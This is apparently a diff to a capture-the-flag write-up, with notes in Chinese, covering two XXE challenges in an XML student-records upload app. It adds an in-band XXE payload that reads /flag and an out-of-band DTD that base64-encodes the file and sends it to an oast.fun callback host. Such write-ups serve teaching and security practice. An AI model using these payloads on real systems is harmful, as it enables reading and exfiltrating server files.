@@ -772,7 +772,38 @@ echo base64_encode(serialize(new Psr6Cache()));
 > `先上传data.xml，发现/uploads/data.xml已经有原本文件，无法覆盖。通过"查看学籍数据"按钮发现index?file=可以加载任意xml文件。`
 >
 > `网页访问/uploads/data.xml找到原本xml文本数据格式，将可以页面回显的标签修改成XXE-payload。上传 data2.xml 成功后，通过index?file=data2.xml`
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE class [
+<!ELEMENT class ANY >
+<!ENTITY xxe SYSTEM "file:///flag" >]>
+<class>
+    <student>
+        <name>flag</name>
+        <year>&xxe;</year>
+        <school>heihei</school>
+    </student>
+</class>
+```
+
 
 ### XXE-PHP-002
 
 > `与上一题类似的无回显XXE版本。考察无回显XXE下使用OOB带外获取数据，用XXE-OOB-payload带出到ceye或者vps上即可。`
+
+dtd.xml 
+```xml
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://sxielvzhzqayslxhetklcq64byiulay79.oast.fun/?result=%file;'>">
+```
+data.xml
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [
+        <!ENTITY % dtd SYSTEM 'http://127.0.0.1:80/uploads/dtd.xml'>%dtd;%all;%send;
+        ]>
+<class>
+    %dtd;
+</class>
+
+```
